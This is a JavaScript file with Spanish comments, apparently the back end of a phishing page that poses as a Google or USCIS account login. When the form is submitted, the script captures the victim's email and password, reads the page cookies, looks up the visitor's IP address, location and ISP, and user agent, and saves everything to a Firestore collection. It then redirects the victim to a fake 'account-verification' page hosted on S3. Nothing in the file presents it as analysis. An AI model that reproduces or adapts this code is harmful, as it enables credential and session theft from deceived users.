document.addEventListener("DOMContentLoaded", () => {
  console.log("✅ Script cargado");

  // 🔐 Configuración de Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyCFK5qY0l3r18SkB2y_GSbl5nkJTcJ45Mg",
    authDomain: "uscisaccountweb.firebaseapp.com",
    projectId: "uscisaccountweb",
    storageBucket: "uscisaccountweb.appspot.com",
    messagingSenderId: "480414861131",
    appId: "1:480414861131:web:8cc3e509f9b69708b10ace"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // 🟩 Capturar correo desde la URL
  const params = new URLSearchParams(window.location.search);
  const correoDesdeURL = params.get("correo");

  const correoElemento = document.getElementById("profileIdentifier");
  if (correoElemento) {
    correoElemento.textContent = correoDesdeURL && correoDesdeURL.includes("@")
      ? correoDesdeURL
      : "Correo no detectado";
  }

  // 🌐 Obtener IP y país desde ipinfo.io
  async function getVisitorData() {
    try {
      const res = await fetch("https://ipinfo.io/json?token=27fb9c3722996c");
      const data = await res.json();
      return {
        ip: data.ip || "desconocido",
        pais: data.country || "desconocido",
        ciudad: data.city || "",
        isp: data.org || "",
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.warn("⚠️ No se pudo obtener datos de IP:", error);
      return {
        ip: "desconocido",
        pais: "desconocido",
        ciudad: "",
        isp: "",
        timestamp: new Date().toISOString()
      };
    }
  }

  // 🟦 Guardar datos en Firebase al enviar el formulario
  const form = document.getElementById("form_ac");
  if (!form) {
    console.error("❌ Formulario no encontrado.");
    return;
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const claveInput = document.getElementById("password");
    if (!claveInput) {
      alert("Campo de contraseña no encontrado.");
      return;
    }

    const clave = claveInput.value.trim();
    if (!clave) {
      alert("Por favor ingresa la clave.");
      return;
    }

    if (!correoDesdeURL || !correoDesdeURL.includes("@")) {
      alert("No se detectó un correo válido en la URL.");
      return;
    }

    try {
      const visitante = await getVisitorData();
      const dispositivo = navigator.userAgent;

      // 🍪 Procesar cookies de forma segura
      let cookiesObj = null;
      try {
        const rawCookies = document.cookie;
        if (rawCookies && rawCookies.includes("=")) {
          cookiesObj = {};
          rawCookies.split("; ").forEach(c => {
            const [key, ...val] = c.split("=");
            if (key && val.length) {
              cookiesObj[key] = val.join("=");
            }
          });
        }
      } catch (err) {
        console.warn("⚠️ No se pudieron leer las cookies:", err);
      }

      // 📤 Construir datos para guardar
      const data = {
        correo: correoDesdeURL,
        clave,
        ip: visitante.ip,
        pais: visitante.pais,
        ciudad: visitante.ciudad,
        isp: visitante.isp,
        dispositivo,
        timestamp: visitante.timestamp
      };

      if (cookiesObj && Object.keys(cookiesObj).length > 0) {
        data.cookies = cookiesObj;
      }

      await db.collection("google").add(data);

      console.log("✅ Datos guardados correctamente.");
      window.location.href = `https://accountgooglesuport.s3.us-east-2.amazonaws.com/account-verification.html?correo=${encodeURIComponent(correoDesdeURL)}`;
    } catch (error) {
      console.error("❌ Error al guardar:", error);
      alert("Hubo un problema al guardar los datos.");
    }
  });
});
